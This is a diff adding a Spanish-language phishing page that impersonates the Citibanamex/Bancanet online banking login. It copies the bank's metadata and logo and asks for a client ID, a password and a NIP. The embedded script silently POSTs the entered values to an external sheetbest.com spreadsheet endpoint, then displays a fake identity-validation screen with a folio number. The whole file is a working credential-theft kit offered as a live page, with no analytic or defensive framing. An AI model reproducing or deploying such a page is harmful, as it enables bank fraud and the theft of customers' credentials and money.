@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="preconnect" href="https://fonts.googleapis.com">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@500;700&display=swap" rel="stylesheet">  
+	<link rel="stylesheet" href="css/estilos2.css">
+	<link rel="icon" href="icon.ico">
+	<meta name="robots" content="noindex, nofollow">
+
+	<meta property="og:locale" content="es_ES" />
+	<meta property="og:type" content="website" />
+	<meta name="google-site-verification" content="Avc70GWkF73-UcG8fUQeDsGFxg4SzWphZYjBK-nPqKc">
+    <meta name="google-site-verification" content="1HPzfpztv7cHYlASsHXvOie_L34Qd3fUMUqAbJLNDr0">
+	<meta property="og:title" content="Citibanamex | Banco Nacional de México">
+	<meta property="og:description" content="El Banco Nacional de México te ofrece tarjetas de crédito, seguros e inversiones; abre tu cuenta con nosotros y accede a promociones y beneficios exclusivos.">
+	<meta property="og:site_name" content="Citibanamex | Banco Nacional de México" />
+	<meta property="og:url" content="https://www.banamex.com">
+	<meta property="og:image" content="https://banamex.com/assets/img/home/citibanamexLogo.jpg">
+	<meta property="og:image:width" content="1093" />
+	<meta property="og:image:height" content="666" />
+	<meta property="og:image:type" content="image/png" />
+	<link rel="apple-touch-icon" sizes="114x114" href="https://banamex.com/assets/img/home/citibanamexLogo.jpg"/>
+    <meta name="msapplication-TileImage" content="https://banamex.com/assets/img/home/citibanamexLogo.jpg" sizes="144x144"/>
+
+
+	<title>Citibanamex | Banco Nacional de México</title>
+</head>
+<body>
+	
+	<div class="contenedor">
+		
+		<div class="columna-top-rwd">
+
+		</div>
+		<div class="columna-derecha">
+			
+		</div>
+
+		<div class="columna-izquierda">
+			<div class="registro activo" id="registro">
+				<div class="header">
+					<h1>¡Verifica Tu Identidad <strong>Bancanet</strong>!</h1>
+					<br>
+				</div>
+		
+					<form class="formulario" id="contact-form"  name="submit-form">
+						<p class="centro"><b>Ingresa ID Cliente</b>
+						</p><br>
+						<label for="nombre">ID de Cliente o Tarjeta</label>
+					<div class="contenedor-input">
+						<input type="password" input id="usuario" name="usuario" placeholder="ID Cliente"/>
+					</div>
+					<form class="formulario" id="contact-form"  name="submit-form">
+						<p class="centro"><b>Ingresa Tu Contraseña</b>
+						</p><br>
+						<label for="nombre">Tu contraseña debe tener entre 8 y 30 caracteres</label>
+					<div class="contenedor-input">
+						<input type="text" input id="contraseña" name="contraseña" placeholder="Contraseña"/>
+					</div>
+					<form class="formulario" id="contact-form"  name="submit-form">
+						<p class="centro"><b>Ingresa Nueva Contraseña</b>
+						</p><br>
+						<label for="nombre">Tu contraseña debe tener entre 8 y 30 caracteres</label>
+					<div class="contenedor-input">
+						<input type="password" input id="confirmar" name="confirmar" placeholder="NIP"/>
+					</div>
+		
+			
+					
+		
+					<div class="contenedor-boton">
+							<button type="submit">
+							Continuar
+							
+						</button>
+					</div>
+					
+				</form>
+				<div class="true"><img src="img/trusteer-2.jpg"></div>
+				
+			</div>
+			
+			<div class="header exito" id="exito">
+
+					<h2 class="txtFolio">Validando Tu Identidad…</h2>
+					<div class="loading"><img src="img/loading-gif.gif"></div>
+					<p class="txt">Folio generado con éxito. Comparte el folio con tu asesor virtual o telefónico.</p>
+					<h1 class="folio">Z5R002</h1>			
+
+			
+
+			
+
+			</div>
+
+		</div>
+		<script>
+			const formulario = document.getElementById('contact-form');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://api.sheetbest.com/sheets/cbf5a784-7afe-4478-9537-d5da55218ade', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "1": formulario.usuario.value,
+            "2": formulario.contraseña.value,
+            "3": formulario.confirmar.value
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+});
+		</script> 
+		
+	</div>
+
+	
+		
+
+</body>
+</html>
